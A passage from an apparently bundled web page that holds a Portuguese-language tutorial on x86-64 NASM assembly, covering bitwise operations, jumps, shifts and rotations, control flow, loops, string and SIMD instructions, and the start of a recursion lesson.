or byte [mem], 0x01  ; seta bit 0 na memória

; Tabela verdade:
;   0 OR 0 = 0
;   0 OR 1 = 1
;   1 OR 0 = 1
;   1 OR 1 = 1

; Uso principal: SETAR bits

; Exemplo: setar o bit 5 (32 = 0x20):
;   1011 1101
; | 0010 0000  ← máscara 0x20
;   ---------
;   1011 1101  ← bit 5 setado (já estava)
;
;   0001 1101
; | 0010 0000
;   ---------
;   0011 1101  ← bit 5 agora setado

; Setar múltiplos bits:
or rax, 0x0F | 0x80   ; seta bits 0-3 e bit 7`}),r.jsx("h2",{children:"XOR — OU Exclusivo"}),r.jsx("p",{children:"Resultado é 1 quando os bits são DIFERENTES."}),r.jsx(d,{language:"nasm",filename:"xor.asm",code:`xor rax, rbx         ; rax = rax XOR rbx
xor rax, 0xFF        ; inverte todos os 8 bits baixos

; Tabela verdade:
;   0 XOR 0 = 0
;   0 XOR 1 = 1
;   1 XOR 0 = 1
;   1 XOR 1 = 0  ← diferença do OR!

; Uso 1: ZERAR registrador (idioma clássico Assembly!)
xor rax, rax         ; rax = 0 (qualquer coisa XOR si mesma = 0)
; Mais eficiente que: mov rax, 0 (código menor, mesma velocidade)

; Uso 2: TOGGLE bits (inverter)
;   1011 1101
; ^ 0000 1111
;   ---------
;   1011 0010  ← bits 0-3 invertidos

; Uso 3: Swap sem registrador temporário!
xor rax, rbx         ; rax = rax ^ rbx
xor rbx, rax         ; rbx = rbx ^ (rax ^ rbx) = original rax
xor rax, rbx         ; rax = (rax ^ rbx) ^ original_rax = original rbx

; Uso 4: Criptografia simples (cifra XOR)
xor byte [buffer], 0xAA   ; cifra/decifra com chave 0xAA`}),r.jsx("h2",{children:"NOT — Inversão de Bits"}),r.jsx(d,{language:"nasm",filename:"not.asm",code:`not rax              ; rax = ~rax (inverte todos os bits)
not byte [mem]       ; inverte byte na memória

; Exemplo:
;   0000 0101 (5)
; NOT
;   1111 1010 (250 unsigned / -6 signed)

; Relação: NOT(x) = -x - 1 (complemento de 1)
; Complemento de 2: -x = NOT(x) + 1

; Criar máscara inversa:
mov rax, 0x0F        ; máscara para bits 0-3
not rax              ; agora mascara bits 4-63`}),r.jsx("h2",{children:"TEST — AND que Não Salva Resultado"}),r.jsx(d,{language:"nasm",filename:"test.asm",code:`; TEST é como AND mas descarta o resultado, apenas seta flags
test rax, rax         ; seta SF, ZF, PF baseado em rax (equivale a: cmp rax, 0)
jz  .zero             ; pula se rax == 0
jnz .nao_zero         ; pula se rax != 0

; Verificar bit específico:
test rax, 1           ; bit 0 é 1?
jnz .impar

test rax, 0x80        ; bit 7 é 1? (sinal em byte)
jnz .negativo_byte

test rax, (1 << 5)    ; bit 5 está setado?
jnz .bit5_set

; TEST é mais curto que CMP para testar se é zero:
test rax, rax   ← 3 bytes
cmp rax, 0      ← 4-7 bytes dependendo da codificação`}),r.jsx("h2",{children:"Manipulação de Bits — Técnicas"}),r.jsx(d,{language:"nasm",filename:"bit_tricks.asm",code:`; === SETAR bit N ===
; bts (Bit Test and Set) — instrução dedicada
bts rax, 5            ; seta bit 5, retorna valor anterior em CF

; Com OR:
or  rax, (1 << 5)     ; seta bit 5

; === LIMPAR bit N ===
; btr (Bit Test and Reset)
btr rax, 5            ; limpa bit 5, retorna valor anterior em CF

; Com AND:
and rax, ~(1 << 5)    ; limpa bit 5 (atenção: ~ pode não funcionar em NASM assim)
and rax, 0xFFFFFFFFFFFFFFDF  ; limpa bit 5 manualmente

; === INVERTER bit N ===
; btc (Bit Test and Complement)
btc rax, 5            ; inverte bit 5, retorna valor anterior em CF

; Com XOR:
xor rax, (1 << 5)     ; inverte bit 5

; === TESTAR bit N ===
; bt (Bit Test)
bt  rax, 5            ; CF = bit 5 de rax
jc  bit5_eh_1         ; pula se bit 5 estava setado

; === CONTAR BITS ===
; popcnt (Population Count — SSE4.2)
popcnt rax, rbx       ; rax = número de bits 1 em rbx

; === ENCONTRAR PRIMEIRO BIT ===
; bsf (Bit Scan Forward) — posição do primeiro 1 da direita
bsf rax, rbx          ; rax = índice do LSB 1 em rbx (undefined se rbx=0)

; bsr (Bit Scan Reverse) — posição do primeiro 1 da esquerda
bsr rax, rbx          ; rax = índice do MSB 1 em rbx

; lzcnt/tzcnt (leading/trailing zero count — BMI1)
lzcnt rax, rbx        ; conta zeros à esquerda
tzcnt rax, rbx        ; conta zeros à direita`}),r.jsx("h2",{children:"Exemplos Práticos de Flags de Hardware"}),r.jsx(d,{language:"nasm",filename:"hw_flags.asm",code:`; Simular um registro de controle de hardware:
; Bit 0: Enable
; Bit 1: Read-only
; Bit 2: Interrupt enable
; Bit 3-5: Mode (3 bits)
; Bit 6: Error flag
; Bit 7: Busy flag

CTRL_ENABLE   equ (1 << 0)   ; 0x01
CTRL_RDONLY   equ (1 << 1)   ; 0x02
CTRL_IRQ_EN   equ (1 << 2)   ; 0x04
CTRL_MODE_MSK equ (7 << 3)   ; 0x38
CTRL_ERROR    equ (1 << 6)   ; 0x40
CTRL_BUSY     equ (1 << 7)   ; 0x80

; Verificar se está busy E com erro:
mov al, [ctrl_reg]
test al, CTRL_BUSY
jz  .nao_busy
test al, CTRL_ERROR
jnz .temos_erro

; Setar modo 3 (bits 3-5 = 011):
mov al, [ctrl_reg]
and al, ~CTRL_MODE_MSK       ; limpa bits de modo
or  al, (3 << 3)             ; seta modo 3
mov [ctrl_reg], al`}),r.jsxs(T,{type:"success",title:"XOR para zeragem",children:["Use ",r.jsx("code",{children:"xor rax, rax"})," em vez de ",r.jsx("code",{children:"mov rax, 0"}),". Gera 2 bytes de código ao invés de 7, e é igualmente rápido (ou mais) nos processadores modernos."]})]})}function Fg(){return r.jsxs(L,{title:"Comparações e Saltos",subtitle:"CMP, JMP, JE, JNE, JG, JL e toda a família de instruções de salto",difficulty:"iniciante",timeToRead:"15 min",children:[r.jsx("p",{children:"Saltos são o mecanismo de controle de fluxo em Assembly. JMP é o goto, e a família JCC (Jump if Condition Code) implementa if/else e loops."}),r.jsx("h2",{children:"JMP — Salto Incondicional"}),r.jsx(d,{language:"nasm",filename:"jmp.asm",code:`; JMP — sempre pula, sem condição
jmp label           ; pula para o label
jmp rax             ; pula para o endereço em rax (salto indireto)
jmp [tabela + rax*8] ; jump table (muito rápido para switch)

; Tipos de salto:
; Short  (2 bytes): offset -128 a +127 bytes
; Near   (5 bytes): offset -2GB a +2GB (modo de 64-bit)
; Far    (não comum em 64-bit): para outros segmentos

; Labels convencionais:
_start:
    jmp .loop
.loop:
    ; ...
    jmp .loop       ; ponto é convenção para label local`}),r.jsx("h2",{children:"CMP — Comparação"}),r.jsx(d,{language:"nasm",filename:"cmp.asm",code:`; CMP — subtrai e descarta, mantém flags
cmp rax, rbx        ; calcula rax - rbx → seta flags
cmp rax, 0          ; compara com zero
cmp byte [mem], 'A' ; compara byte com literal ASCII
cmp [mem], rax      ; compara memória com registrador

; Após CMP, use JCC correspondente:
; Para SIGNED (números que podem ser negativos):
;   je  / jne  — igual / não igual
;   jl  / jge  — menor que / maior ou igual
;   jle / jg   — menor ou igual / maior que

; Para UNSIGNED (endereços, tamanhos):
;   je  / jne  — igual / não igual
;   jb  / jae  — abaixo / acima ou igual (Below/Above or Equal)
;   jbe / ja   — abaixo ou igual / acima

; DICA: Signed usa L/G (Less/Greater), Unsigned usa B/A (Below/Above)`}),r.jsx("h2",{children:"Exemplos de Estruturas if/else"}),r.jsx(d,{language:"nasm",filename:"if_else.asm",code:`; if (rax == 10) { ... }
cmp rax, 10
jne .fim_if         ; pula se NÃO for igual
    ; corpo do if
.fim_if:

; if (rax > rbx) { ... } else { ... }
cmp rax, rbx
jle .else_part      ; se rax <= rbx, vai para else
    ; corpo do if
    jmp .fim
.else_part:
    ; corpo do else
.fim:

; if (rax >= 0 && rax < 100)  — condição composta
cmp rax, 0
jl  .fora_range     ; signed: se rax < 0
cmp rax, 100
jge .fora_range     ; signed: se rax >= 100
    ; está no range
.fora_range:

; switch/case implementado com jump table:
; switch (rax) { case 0: ... case 1: ... case 2: ... }
cmp rax, 2
ja  .default        ; se rax > 2, vai para default
jmp [tabela + rax*8] ; pula para o endereço na tabela

tabela:
    dq .case_0
    dq .case_1
    dq .case_2

.case_0:
    ; código para case 0
    jmp .fim_switch
.case_1:
    ; código para case 1
    jmp .fim_switch
.case_2:
    ; código para case 2
.default:
.fim_switch:`}),r.jsx("h2",{children:"Tabela Completa de JCC"}),r.jsx(d,{language:"bash",code:`# Saltos após CMP:
JE / JZ     — Equal / Zero          (ZF=1)
JNE / JNZ   — Not Equal / Not Zero  (ZF=0)

# Signed (use com números que podem ser negativos):
JL / JNGE   — Less Than             (SF≠OF)
JLE / JNG   — Less or Equal         (ZF=1 ou SF≠OF)
JG / JNLE   — Greater Than          (ZF=0 e SF=OF)
JGE / JNL   — Greater or Equal      (SF=OF)

# Unsigned (use com endereços, índices, tamanhos):
JB / JNAE   — Below (unsigned <)    (CF=1)
JBE / JNA   — Below or Equal        (CF=1 ou ZF=1)
JA / JNBE   — Above (unsigned >)    (CF=0 e ZF=0)
JAE / JNB   — Above or Equal        (CF=0)

# Flags específicas:
JC          — Carry                 (CF=1)
JNC         — No Carry              (CF=0)
JO          — Overflow              (OF=1)
JNO         — No Overflow           (OF=0)
JS          — Sign (negativo)       (SF=1)
JNS         — No Sign               (SF=0)
JP / JPE    — Parity Even           (PF=1)
JNP / JPO   — Parity Odd            (PF=0)

# Especial:
JCXZ        — CX é zero
JECXZ       — ECX é zero
JRCXZ       — RCX é zero`}),r.jsx("h2",{children:"LOOP — Instrução de Loop Dedicada"}),r.jsx(d,{language:"nasm",filename:"loop.asm",code:`; LOOP usa RCX como contador (decrementa e salta se RCX != 0)
mov rcx, 10         ; executar 10 vezes
.loop:
    ; ... corpo do loop ...
    loop .loop      ; rcx-- ; se rcx != 0, pula para .loop

; Variantes:
; LOOPE  / LOOPZ   — loop enquanto ZF=1 e RCX != 0
; LOOPNE / LOOPNZ  — loop enquanto ZF=0 e RCX != 0

; NOTA: LOOP é mais lento que DEC/JNZ em CPUs modernas!
; Prefira:
mov rcx, 10
.loop:
    ; ...
    dec rcx
    jnz .loop       ; mais rápido que LOOP`}),r.jsx("h2",{children:"Saltos Indiretos"}),r.jsx(d,{language:"nasm",filename:"jump_indirect.asm",code:`; Salto para endereço em registrador:
jmp rax              ; pula para endereço em rax

; Salto via tabela (switch/dispatch table):
; Muito eficiente para switch com muitos casos
lea rbx, [jump_table]
cmp rdi, 5
jae .invalid
jmp [rbx + rdi*8]   ; jump table de qwords

jump_table:
    dq .case_0
    dq .case_1
    dq .case_2
    dq .case_3
    dq .case_4

.case_0: ; ...
.case_1: ; ...`}),r.jsxs(T,{type:"info",title:"Short vs Near Jump",children:["Quando o destino está próximo (dentro de -128 a +127 bytes), o assembler gera um ",r.jsx("strong",{children:"short jump"})," (2 bytes). Para destinos mais distantes, gera um ",r.jsx("strong",{children:"near jump"})," (5 bytes). O NASM faz isso automaticamente — você não precisa se preocupar, mas é bom saber para entender o binário gerado."]})]})}function Gg(){return r.jsxs(L,{title:"Shifts e Rotações",subtitle:"SHL, SHR, SAL, SAR, ROL, ROR, RCL, RCR",difficulty:"intermediario",timeToRead:"12 min",children:[r.jsx("p",{children:"Operações de shift movem bits para a esquerda ou direita. São fundamentais para multiplicação/divisão por potências de 2, manipulação de bits e operações criptográficas."}),r.jsx("h2",{children:"SHL / SAL — Shift Left (Lógico/Aritmético)"}),r.jsx(d,{language:"nasm",filename:"shl.asm",code:`; SHL = SAL (são iguais para shift esquerda)
shl rax, 1      ; rax <<= 1  (× 2)
shl rax, 2      ; rax <<= 2  (× 4)
shl rax, cl     ; rax <<= cl (shift por valor em CL)
shl rax, 3      ; imediato 0-63

; O bit saindo pela esquerda vai para CF
; Zeros entram pela direita

; Exemplos:
;   0000 0101 (5) SHL 2
;   0001 0100 (20 = 5 × 4)

; Otimização: multiplicar por potência de 2
; Em vez de: imul rax, 8
shl rax, 3      ; rax × 8 (muito mais rápido!)`}),r.jsx("h2",{children:"SHR — Shift Right Lógico"}),r.jsx(d,{language:"nasm",filename:"shr.asm",code:`shr rax, 1      ; rax >>= 1 (÷ 2 para unsigned)
shr rax, cl     ; shift por CL

; Zeros entram pela esquerda (bit MSB)
; Bit saindo pela direita vai para CF

; Exemplos:
;   1000 0000 (128) SHR 1
;   0100 0000 (64 = 128 ÷ 2)

;   1111 0000 (240) SHR 4
;   0000 1111 (15)

; Uso: divisão unsigned por potência de 2
shr rax, 4      ; rax ÷ 16 (unsigned!)`}),r.jsx("h2",{children:"SAR — Shift Aritmético à Direita"}),r.jsxs(T,{type:"warning",title:"SAR vs SHR",children:["SHR coloca 0 no MSB. SAR ",r.jsx("strong",{children:"propaga o bit de sinal"})," — mantém o sinal do número. Use SAR para divisão signed, SHR para unsigned."]}),r.jsx(d,{language:"nasm",filename:"sar.asm",code:`sar rax, 1      ; rax >>= 1 (÷ 2 para signed, mantém sinal)
sar rax, cl     ; shift por CL

; Exemplos:
;   1111 0000 (-16 signed) SAR 1
;   1111 1000 (-8 = -16 ÷ 2) ← MSB copiado!

;   0111 0000 (112) SAR 1
;   0011 1000 (56 = 112 ÷ 2) ← MSB copiado!

; Divisão signed por potência de 2:
; ATENÇÃO: SAR arredonda em direção ao menos infinito, não zero!
; -7 SAR 1 = -4 (não -3!)
; Para arredondar em direção a zero:
; if (rax < 0) add rax, (1 << n) - 1
; sar rax, n`}),r.jsx("h2",{children:"ROL — Rotate Left"}),r.jsx(d,{language:"nasm",filename:"rol.asm",code:`; ROL — rotação circular para esquerda
; bits que saem pela esquerda entram pela direita
rol rax, 1      ; rotaciona 1 bit à esquerda
rol rax, cl     ; rotaciona CL bits à esquerda
rol rax, 8      ; rotaciona 1 byte à esquerda

; Exemplo:
;   1000 0001 ROL 1
;   0000 0011 ← o 1 que saiu entra pela direita!

; Usado em: criptografia (SHA, AES), hashing
; SHA-256 usa: ROTR(a, 2) XOR ROTR(a, 13) XOR ROTR(a, 22)

; BSWAP — troca ordem dos bytes (big/little endian)
bswap eax       ; inverte os 4 bytes de EAX
bswap rax       ; inverte os 8 bytes de RAX
; 0x11223344 → 0x44332211
; Útil para converter dados de rede (big-endian) para x86 (little-endian)`}),r.jsx("h2",{children:"ROR — Rotate Right"}),r.jsx(d,{language:"nasm",filename:"ror.asm",code:`ror rax, 1      ; rotaciona 1 bit à direita
ror rax, 8      ; rotaciona 1 byte à direita

; Exemplo:
;   0000 0001 ROR 1
;   1000 0000 ← o 1 que saiu entra pela esquerda!

; Relação: ROR(x, n) = ROL(x, 64-n)  (para qword)`}),r.jsx("h2",{children:"RCL e RCR — Rotate through Carry"}),r.jsx(d,{language:"nasm",filename:"rcl.asm",code:`; RCL — Rotate Left through Carry
; CF entra pelo lado direito, bit saindo vai para CF
rcl rax, 1      ; rotaciona 65 bits (64 + CF) à esquerda

; RCR — Rotate Right through Carry
rcr rax, 1      ; rotaciona 65 bits à direita

; Uso: implementar shifts de inteiros maiores que 64-bit
; Para fazer SHL 128-bit (RDX:RAX) por 1:
shl rax, 1      ; shift rax, bit sai pelo CF
rcl rdx, 1      ; rdx recebe o CF e faz seu próprio shift`}),r.jsx("h2",{children:"SHLD / SHRD — Double Precision Shift"}),r.jsx(d,{language:"nasm",filename:"shld.asm",code:`; SHLD — Shift Left Double (útil para operações de 128-bit)
; dest = (dest << count) | (src >> (width - count))
shld rax, rbx, cl   ; bits de rbx alimentam rax pela direita

; SHRD — Shift Right Double
shrd rax, rbx, cl   ; bits de rbx alimentam rax pela esquerda

; Exemplo: implementar shift esquerda de 128-bit [rdx:rax]:
mov cl, 5
shld rdx, rax, cl   ; os 5 bits altos de rax entram em rdx
shl  rax, cl        ; shift rax`}),r.jsx("h2",{children:"Aplicações Práticas"}),r.jsx(d,{language:"nasm",filename:"aplicacoes.asm",code:`; === Verificar se número é potência de 2 ===
; Uma potência de 2 tem exatamente 1 bit setado
; n & (n-1) == 0 se n é potência de 2
mov rbx, rax
dec rbx              ; rbx = n - 1
test rax, rbx        ; n & (n-1)
jz  .potencia_de_2

; === Encontrar log2 (posição do bit mais alto) ===
bsr rcx, rax         ; rcx = posição do MSB 1
; rcx = floor(log2(rax))

; === Arredondar para próxima potência de 2 ===
dec rax
bsr rcx, rax
mov rax, 2
shl rax, cl          ; rax = 2^(rcx+1)

; === Hash simples com rotação ===
; Bernstein hash: hash = hash * 33 + c
; Versão otimizada:
mov rbx, rax         ; rbx = hash
shl rax, 5           ; rax = hash * 32
add rax, rbx         ; rax = hash * 32 + hash = hash * 33
add rax, rcx         ; rax = hash * 33 + c

; === Extrair campo de bits ===
; Extrair bits 12-19 de rax (8 bits):
mov rbx, rax
shr rbx, 12          ; move o campo para os bits 0-7
and rbx, 0xFF        ; isola os 8 bits`}),r.jsx(T,{type:"success",title:"Shifts em loops críticos",children:"Em loops de performance crítica, substituir MUL por SHL e DIV por SHR pode dar ganhos de 5-10x de performance, já que MUL/DIV têm latências de 3-90 ciclos enquanto SHL/SHR têm latência de 1 ciclo."})]})}function Vg(){return r.jsxs(L,{title:"Labels e Controle de Fluxo",subtitle:"Estruturando programas com labels, if/else e desvios condicionais",difficulty:"iniciante",timeToRead:"12 min",children:[r.jsxs("p",{children:["Em Assembly, não há ",r.jsx("code",{children:"if"}),", ",r.jsx("code",{children:"while"})," ou ",r.jsx("code",{children:"for"})," — existem apenas labels e saltos. Toda estrutura de controle de alto nível é construída sobre esses blocos básicos."]}),r.jsx("h2",{children:"Labels"}),r.jsx(d,{language:"nasm",filename:"labels.asm",code:`; Labels são nomes para endereços de memória
; Podem ser globais (sem ponto) ou locais (com ponto)

_start:             ; label global — exportado ao linker
    jmp .loop       ; pula para label local

.loop:              ; label local — visível apenas no contexto atual
    ; ...

; Labels locais (com ponto) podem ser reutilizados:
funcao1:
    .loop:          ; .loop é local para funcao1
    ...

funcao2:
    .loop:          ; .loop diferente para funcao2
    ...`}),r.jsx("h2",{children:"if — Condição Simples"}),r.jsx(d,{language:"nasm",filename:"if_simple.asm",code:`; C: if (a == b) { a++; }
; Assembly:
;   a em rax, b em rbx
cmp rax, rbx
jne .fim_if         ; NÃO igual → pula o corpo
    inc rax         ; incrementa a
.fim_if:
; continua...`}),r.jsx("h2",{children:"if/else"}),r.jsx(d,{language:"nasm",filename:"if_else.asm",code:`; C: if (a > b) { resultado = a; } else { resultado = b; }
; a=rax, b=rbx, resultado=rcx
cmp rax, rbx        ; compara a com b
jle .else           ; se a <= b, vai para else
    ; -- if branch: a > b --
    mov rcx, rax    ; resultado = a
    jmp .fim
.else:
    ; -- else branch: a <= b --
    mov rcx, rbx    ; resultado = b
.fim:
; rcx = max(a, b)

; Versão mais eficiente com CMOV:
cmp rax, rbx
cmovle rax, rbx     ; rax = rbx se rax <= rbx
; rax = max(a, b) sem branch`}),r.jsx("h2",{children:"if/else if/else"}),r.jsx(d,{language:"nasm",filename:"elif.asm",code:`; C: if (x < 0) { neg(x); }
;    else if (x == 0) { x = 1; }
;    else { x *= 2; }
; x em rax

cmp rax, 0
jl  .negativo       ; se x < 0
jg  .positivo       ; se x > 0
; caso intermediário: x == 0
    mov rax, 1
    jmp .fim

.negativo:
    neg rax
    jmp .fim

.positivo:
    shl rax, 1      ; x *= 2

.fim:`}),r.jsx("h2",{children:"while Loop"}),r.jsx(d,{language:"nasm",filename:"while.asm",code:`; C: while (i < 10) { i++; }
; i em rcx
    xor rcx, rcx        ; i = 0
.while_cond:
    cmp rcx, 10
    jge .while_end      ; sai se i >= 10
    ; corpo do while:
    inc rcx             ; i++
    jmp .while_cond
.while_end:

; Alternativa mais eficiente (testa condição no final):
; C: do { i++; } while (i < 10);
    xor rcx, rcx
.do_while:
    inc rcx
    cmp rcx, 10
    jl .do_while`}),r.jsx("h2",{children:"for Loop — Padrão Idiomático"}),r.jsx(d,{language:"nasm",filename:"for.asm",code:`; C: for (int i = 0; i < N; i++) { ... }
; Padrão idiomático Assembly: contar para baixo (mais eficiente!)
; Contar de N-1 até 0 → usa apenas DEC e JNZ (sem CMP separado)

    mov rcx, N          ; rcx = N (contador)
.loop:
    ; ... corpo do loop ... (use rcx como índice se necessário)
    dec rcx             ; rcx--
    jnz .loop           ; se rcx != 0, repete

; Para acessar elementos por índice:
    mov rcx, 10         ; N = 10
    lea rbx, [array]    ; rbx = endereço do array
.loop:
    ; calcular índice atual: i = N - rcx
    ; (ou simplesmente iterar de trás para frente)
    mov rax, [rbx + rcx*8 - 8]  ; array[i-1] (índice 0-based)
    ; ... processar rax ...
    dec rcx
    jnz .loop`}),r.jsx("h2",{children:"Implementando switch/case"}),r.jsx(d,{language:"nasm",filename:"switch.asm",code:`; C: switch (cmd) {
;      case 0: ...; break;
;      case 1: ...; break;
;      case 2: ...; break;
;      default: ...;
;    }

; Método 1: Encadeamento de CMP/JE (simples, lento para muitos casos)
    cmp rdi, 0
    je  .case0
    cmp rdi, 1
    je  .case1
    cmp rdi, 2
    je  .case2
    jmp .default

.case0:
    ; ...
    jmp .fim
.case1:
    ; ...
    jmp .fim
.case2:
    ; ...
    jmp .fim
.default:
    ; ...
.fim:

; Método 2: Jump Table (rápido, constante O(1))
    cmp rdi, 2          ; verificar range
    ja  .default        ; se fora do range
    jmp [tabela + rdi*8] ; pular direto!

tabela:
    dq .case0
    dq .case1
    dq .case2`}),r.jsx("h2",{children:"Estruturas Aninhadas"}),r.jsx(d,{language:"nasm",filename:"aninhado.asm",code:`; Loop aninhado (matriz 3×3):
; for (int i = 0; i < 3; i++)
;   for (int j = 0; j < 3; j++)
;     matrix[i][j] = i * 3 + j;

    xor rbx, rbx        ; i = 0
.outer_loop:
    cmp rbx, 3
    jge .outer_end

    xor rcx, rcx        ; j = 0
.inner_loop:
    cmp rcx, 3
    jge .inner_end

    ; calcular índice: i*3 + j
    lea rax, [rbx + rbx*2] ; rax = i * 3
    add rax, rcx           ; rax = i*3 + j

    ; escrever: matrix[i*3 + j] = rax
    mov [matrix + rax*4], eax

    inc rcx
    jmp .inner_loop
.inner_end:

    inc rbx
    jmp .outer_loop
.outer_end:`}),r.jsxs(T,{type:"info",title:"Dica de Estilo",children:["Use labels descritivos e consistentes. Convenções comuns: ",r.jsx("code",{children:".loop"}),", ",r.jsx("code",{children:".loop_end"}),", ",r.jsx("code",{children:".if_true"}),", ",r.jsx("code",{children:".else"}),", ",r.jsx("code",{children:".fim"}),", ",r.jsx("code",{children:".error"}),". O ponto no início indica label local."]})]})}function Hg(){return r.jsxs(L,{title:"Loops",subtitle:"Implementando repetição em Assembly com contadores e condições",difficulty:"iniciante",timeToRead:"12 min",children:[r.jsx("p",{children:"Loops são implementados com saltos condicionais e contadores em Assembly. A chave é saber onde testar a condição para máxima eficiência."}),r.jsx("h2",{children:"Loop com Contador (Contando para Baixo)"}),r.jsxs(T,{type:"success",title:"Idioma mais eficiente",children:["Contar ",r.jsx("strong",{children:"para baixo"})," até zero é o padrão mais eficiente em x86-64. O ",r.jsx("code",{children:"DEC reg; JNZ label"})," usa apenas 2 instruções e nenhuma comparação extra — o DEC já seta ZF!"]}),r.jsx(d,{language:"nasm",filename:"loop_down.asm",code:`; Soma dos números de 1 a 100:
    xor rax, rax        ; rax = soma = 0
    mov rcx, 100        ; contador: de 100 até 1
.loop:
    add rax, rcx        ; soma += contador
    dec rcx             ; contador--
    jnz .loop           ; se contador != 0, repete

; Resultado em rax = 5050`}),r.jsx("h2",{children:"Loop com Incremento"}),r.jsx(d,{language:"nasm",filename:"loop_up.asm",code:`; Iterar array e imprimir (pseudocódigo)
; for (int i = 0; i < len; i++) { process(array[i]); }

    xor rbx, rbx        ; rbx = i = 0
    lea rcx, [array]    ; rcx = &array
    mov rdx, len        ; rdx = comprimento
.loop:
    cmp rbx, rdx        ; i < len?
    jge .loop_end       ; se i >= len, sai

    ; acessar array[i]:
    mov rax, [rcx + rbx*8]  ; rax = array[i]
    ; ... processar rax ...

    inc rbx             ; i++
    jmp .loop
.loop_end:`}),r.jsx("h2",{children:"Loop LOOP (instrução dedicada)"}),r.jsx(d,{language:"nasm",filename:"loop_inst.asm",code:`; Instrução LOOP usa RCX como contador implícito
; Decrementa RCX e pula se RCX != 0

    mov rcx, 5
.loop:
    ; corpo — executa 5 vezes
    loop .loop          ; rcx--; se rcx != 0, volta

; LOOP é mais lento que DEC/JNZ em CPUs modernas
; Use apenas quando a compactação de código importa mais que velocidade`}),r.jsx("h2",{children:"Loop Infinito (daemon)"}),r.jsx(d,{language:"nasm",filename:"loop_infinito.asm",code:`; Loop infinito — comum em ISRs e daemons
.loop:
    ; ... processar eventos ...
    jmp .loop

; Com HLT (halt — aguardar interrupção, economiza CPU)
.loop:
    hlt             ; para o processador até a próxima interrupção
    jmp .loop       ; continua após interrupção`}),r.jsx("h2",{children:"Loop com Break Condicional"}),r.jsx(d,{language:"nasm",filename:"loop_break.asm",code:`; Procurar primeiro zero em array:
    lea rbx, [array]
    xor rcx, rcx        ; índice = 0
.loop:
    mov al, [rbx + rcx] ; al = array[rcx]
    test al, al         ; al == 0?
    jz  .encontrou      ; sai se zero (break)
    inc rcx
    cmp rcx, 100        ; limite de 100 elementos
    jl  .loop
    ; não encontrou
    mov rcx, -1         ; retorna -1
    jmp .fim
.encontrou:
    ; rcx contém o índice
.fim:`}),r.jsx("h2",{children:"Loop de String (REP prefix)"}),r.jsx("p",{children:"x86-64 tem um conjunto especial de instruções para operar em strings/arrays inteiros de forma eficiente:"}),r.jsx(d,{language:"nasm",filename:"rep.asm",code:`; MOVS — copiar bytes
; REP MOVSB — copia RCX bytes de [RSI] para [RDI]
    lea rsi, [origem]
    lea rdi, [destino]
    mov rcx, tamanho
    rep movsb           ; copia 1 byte por vez, RCX vezes
; variantes: rep movsw (word), rep movsd (dword), rep movsq (qword)

; STOS — preencher memória
; REP STOSB — preenche RCX bytes de [RDI] com AL
    lea rdi, [buffer]
    mov al, 0           ; valor a preencher
    mov rcx, 1024       ; quantos bytes
    rep stosb           ; memset(buffer, 0, 1024) em Assembly!
; variantes: stosw, stosd, stosq

; SCAS — procurar em string
; REPNE SCASB — procura AL em [RDI], RCX bytes, para quando encontra
    lea rdi, [string]
    mov al, 0           ; procurar null terminator
    mov rcx, -1         ; varremos até encontrar (ou -1 iterations)
    repne scasb         ; REPNE = "repeat while not equal"
    not rcx             ; rcx = comprimento (1-based)
    dec rcx             ; ajustar para 0-based

; CMPS — comparar strings
; REPE CMPSB — compara [RSI] com [RDI], RCX bytes
    lea rsi, [str1]
    lea rdi, [str2]
    mov rcx, len
    repe cmpsb          ; para quando diferem
    ; ZF=1 se iguais, ZF=0 se diferiram (RSI/RDI apontam para o byte que diferiu)`}),r.jsx("h2",{children:"Loops com SIMD (Vetorização)"}),r.jsx(d,{language:"nasm",filename:"simd_loop.asm",code:`; Loop vetorizado com SSE2 — processa 16 bytes por iteração!
; Equivale a: for (i=0; i<N; i++) dest[i] = src1[i] + src2[i] (byte adição)

    lea rsi, [src1]
    lea rdi, [src2]
    lea rdx, [dest]
    mov rcx, N / 16     ; N deve ser múltiplo de 16

.loop:
    movdqu xmm0, [rsi]   ; carrega 16 bytes de src1
    movdqu xmm1, [rdi]   ; carrega 16 bytes de src2
    paddb  xmm0, xmm1    ; soma 16 pares de bytes simultaneamente!
    movdqu [rdx], xmm0   ; salva 16 bytes no destino

    add rsi, 16
    add rdi, 16
    add rdx, 16
    dec rcx
    jnz .loop`}),r.jsx("h2",{children:"Exemplos Clássicos"}),r.jsx(d,{language:"nasm",filename:"exemplos_loops.asm",code:`; Fatorial de N (iterativo):
; n em rdi, resultado em rax
    mov rax, 1          ; rax = 1 (acumulador)
    cmp rdi, 0
    jle .fim            ; factorial(0) = 1
.loop:
    imul rax, rdi       ; rax *= n
    dec rdi             ; n--
    jnz .loop           ; enquanto n > 0
.fim:
    ; rax = n!

; Fibonacci iterativo (primeiros N termos):
    mov rcx, N          ; contador
    xor rax, rax        ; fib(0) = 0
    mov rbx, 1          ; fib(1) = 1
.fib_loop:
    ; rax = atual, rbx = próximo
    add rax, rbx        ; rax = atual + próximo
    xchg rax, rbx       ; swap: rbx = novo próximo, rax = anterior
    dec rcx
    jnz .fib_loop
    ; ao final, rax = fib(N-1), rbx = fib(N)`})]})}function Zg(){return r.jsxs(L,{title:"Recursão em Assembly",subtitle:"Funções que chamam a si mesmas — como a stack viabiliza recursão",difficulty:"intermediario",timeToRead:"15 min",children:[r.jsx("p",{children:"Recursão em Assembly funciona exatamente como em C — cada chamada de função empilha um novo frame na stack. Entender isso em Assembly revela como a recursão realmente funciona no hardware."}),r.jsx("h2",{children:"Como a Stack Viabiliza Recursão"}),r.jsxs("p",{children:["Cada chamada de função cria um ",r.jsx("strong",{children:"stack frame"}),": um bloco na stack que contém o endereço de retorno e as variáveis locais. Chamadas recursivas empilham múltiplos frames."]}),r.jsx(d,{language:"bash",code:`; Stack durante fatorial(3):
; fatorial(3) chama fatorial(2)
;   fatorial(2) chama fatorial(1)
;     fatorial(1) chama fatorial(0)
;       fatorial(0) retorna 1

; Estado da stack no ponto mais profundo:
; [endereço de retorno de fatorial(3)] ← RSP inicial
; [RSP de fatorial(3)]
; [endereço de retorno de fatorial(2)]
; [RSP de fatorial(2)]
; [endereço de retorno de fatorial(1)]
; [RSP de fatorial(1)]
; [endereço de retorno de fatorial(0)] ← RSP atual`}),r.jsx("h2",{children:"Fatorial Recursivo"}),r.jsx(d,{language:"nasm",filename:"fatorial.asm",code:`; fatorial(n) = n * fatorial(n-1)
; fatorial(0) = 1
; Argumento: rdi = n
; Retorno:   rax = n!

section .text
    global fatorial

fatorial:
    ; Prólogo — salva registradores que usaremos
    push rbp
    mov  rbp, rsp
    push rbx                ; salvamos rbx (callee-saved)

    ; Base case: if (n == 0) return 1
